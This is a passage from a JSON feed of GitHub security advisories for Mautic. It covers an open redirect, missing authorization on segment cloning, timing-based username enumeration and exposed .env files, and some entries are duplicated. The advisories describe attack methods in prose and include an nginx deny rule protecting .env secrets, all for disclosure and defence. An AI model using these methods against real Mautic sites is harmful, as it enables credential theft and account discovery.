href=\"https://github.com/advisories/GHSA-6vx9-9r2g-8373\">https://github.com/advisories/GHSA-6vx9-9r2g-8373</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6vx9-9r2g-8373",
            "title": "[mautic/core] Mautic has an Open Redirect vulnerability on user unlock path.",
            "date_modified": "2025-05-29T07:10:08.000Z",
            "date_published": "2025-05-28T17:39:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6vx9-9r2g-8373"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses a security vulnerability in Mautic related to the segment cloning functionality. This vulnerability allows any authenticated user to clone segments without proper authorization checks.</p>\n<p>Insecure Direct Object Reference (IDOR) / Missing Authorization: A missing authorization vulnerability exists in the <code>cloneAction</code> of the segment management. This allows an authenticated user to bypass intended permission restrictions and clone segments even if they lack the necessary permissions to create new ones.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Update Mautic to a version that implements proper authorization checks for the <code>cloneAction</code> within the <code>ListController.php</code>. Ensure that users attempting to clone segments possess the appropriate creation permissions.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<p>If you have any questions or comments about this advisory:\nEmail us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-vph5-ghq3-q782\">https://github.com/mautic/mautic/security/advisories/GHSA-vph5-ghq3-q782</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47055\">https://nvd.nist.gov/vuln/detail/CVE-2024-47055</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vph5-ghq3-q782\">https://github.com/advisories/GHSA-vph5-ghq3-q782</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vph5-ghq3-q782",
            "title": "[mautic/core] Mautic segment cloning doesn't have a proper permission check",
            "date_modified": "2025-05-28T20:08:20.000Z",
            "date_published": "2025-05-28T17:38:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vph5-ghq3-q782"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses a security vulnerability in Mautic related to the segment cloning functionality. This vulnerability allows any authenticated user to clone segments without proper authorization checks.</p>\n<p>Insecure Direct Object Reference (IDOR) / Missing Authorization: A missing authorization vulnerability exists in the <code>cloneAction</code> of the segment management. This allows an authenticated user to bypass intended permission restrictions and clone segments even if they lack the necessary permissions to create new ones.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Update Mautic to a version that implements proper authorization checks for the <code>cloneAction</code> within the <code>ListController.php</code>. Ensure that users attempting to clone segments possess the appropriate creation permissions.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<p>If you have any questions or comments about this advisory:\nEmail us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-vph5-ghq3-q782\">https://github.com/mautic/mautic/security/advisories/GHSA-vph5-ghq3-q782</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47055\">https://nvd.nist.gov/vuln/detail/CVE-2024-47055</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vph5-ghq3-q782\">https://github.com/advisories/GHSA-vph5-ghq3-q782</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vph5-ghq3-q782",
            "title": "[mautic/core] Mautic segment cloning doesn't have a proper permission check",
            "date_modified": "2025-05-28T20:08:20.000Z",
            "date_published": "2025-05-28T17:38:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vph5-ghq3-q782"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses a security vulnerability in Mautic related to the \"Forget your password\" functionality. This vulnerability could be exploited by unauthenticated users to enumerate valid usernames.</p>\n<p>User Enumeration via Timing Attack: A user enumeration vulnerability exists in the \"Forget your password\" functionality. Differences in response times for existing and non-existing users, combined with a lack of request limiting, allow an attacker to determine the existence of usernames through a timing-based attack.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Please update to a version that addresses this timing vulnerability, where password reset responses are normalized to respond at the same time regardless of user existence.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<p>If you have any questions or comments about this advisory:\nEmail us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-424x-cxvh-wq9p\">https://github.com/mautic/mautic/security/advisories/GHSA-424x-cxvh-wq9p</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47057\">https://nvd.nist.gov/vuln/detail/CVE-2024-47057</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-424x-cxvh-wq9p\">https://github.com/advisories/GHSA-424x-cxvh-wq9p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-424x-cxvh-wq9p",
            "title": "[mautic/core] Mautic allows user name enumeration due to response time difference on password reset form",
            "date_modified": "2025-05-28T20:08:14.000Z",
            "date_published": "2025-05-28T17:38:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-424x-cxvh-wq9p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses a security vulnerability in Mautic related to the \"Forget your password\" functionality. This vulnerability could be exploited by unauthenticated users to enumerate valid usernames.</p>\n<p>User Enumeration via Timing Attack: A user enumeration vulnerability exists in the \"Forget your password\" functionality. Differences in response times for existing and non-existing users, combined with a lack of request limiting, allow an attacker to determine the existence of usernames through a timing-based attack.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Please update to a version that addresses this timing vulnerability, where password reset responses are normalized to respond at the same time regardless of user existence.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<p>If you have any questions or comments about this advisory:\nEmail us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-424x-cxvh-wq9p\">https://github.com/mautic/mautic/security/advisories/GHSA-424x-cxvh-wq9p</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47057\">https://nvd.nist.gov/vuln/detail/CVE-2024-47057</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-424x-cxvh-wq9p\">https://github.com/advisories/GHSA-424x-cxvh-wq9p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-424x-cxvh-wq9p",
            "title": "[mautic/core] Mautic allows user name enumeration due to response time difference on password reset form",
            "date_modified": "2025-05-28T20:08:14.000Z",
            "date_published": "2025-05-28T17:38:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-424x-cxvh-wq9p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses a security vulnerability in Mautic related to the \"Forget your password\" functionality. This vulnerability could be exploited by unauthenticated users to enumerate valid usernames.</p>\n<p>User Enumeration via Timing Attack: A user enumeration vulnerability exists in the \"Forget your password\" functionality. Differences in response times for existing and non-existing users, combined with a lack of request limiting, allow an attacker to determine the existence of usernames through a timing-based attack.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Please update to a version that addresses this timing vulnerability, where password reset responses are normalized to respond at the same time regardless of user existence.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<p>If you have any questions or comments about this advisory:\nEmail us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-424x-cxvh-wq9p\">https://github.com/mautic/mautic/security/advisories/GHSA-424x-cxvh-wq9p</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47057\">https://nvd.nist.gov/vuln/detail/CVE-2024-47057</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-424x-cxvh-wq9p\">https://github.com/advisories/GHSA-424x-cxvh-wq9p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-424x-cxvh-wq9p",
            "title": "[mautic/core] Mautic allows user name enumeration due to response time difference on password reset form",
            "date_modified": "2025-05-28T20:08:14.000Z",
            "date_published": "2025-05-28T17:38:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-424x-cxvh-wq9p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses a security vulnerability in Mautic where sensitive <code>.env</code> configuration files may be directly accessible via a web browser. This exposure could lead to the disclosure of sensitive information, including database credentials, API keys, and other critical system configurations.</p>\n<p>Sensitive Information Disclosure via <code>.env</code> File Exposure: The <code>.env</code> file, which typically contains environment variables and sensitive application configurations, is directly accessible via a web browser due to missing web server configurations that restrict access to such files. This allows an unauthenticated attacker to view the contents of this file by simply navigating to its URL.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Update Mautic to the latest Mautic version.\nBy default, Mautic does not use <code>.env</code> files for production data.</p>\n<p><strong>For Apache users:</strong> Ensure your web server is configured to respect <code>.htaccess</code> files.</p>\n<p><strong>For Nginx users:</strong> As Nginx does not inherently support <code>.htaccess</code> files, you must manually add a configuration block to your Nginx server configuration to deny access to <code>.env</code> files. Add the following to your Nginx configuration for the Mautic site:</p>\n<pre><code class=\"language-nginx\">location ~ /\\.env {\n    deny all;\n}\n</code></pre>\n<p>After modifying your Nginx configuration, remember to reload or restart your Nginx service for the changes to take effect.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-h2wg-v8wg-jhxh\">https://github.com/mautic/mautic/security/advisories/GHSA-h2wg-v8wg-jhxh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47056\">https://nvd.nist.gov/vuln/detail/CVE-2024-47056</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h2wg-v8wg-jhxh\">https://github.com/advisories/GHSA-h2wg-v8wg-jhxh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h2wg-v8wg-jhxh",
            "title": "[mautic/core] Mautic does not shield .env files from web traffic",
            "date_modified": "2025-05-28T20:07:50.000Z",
            "date_published": "2025-05-28T17:38:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h2wg-v8wg-jhxh"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}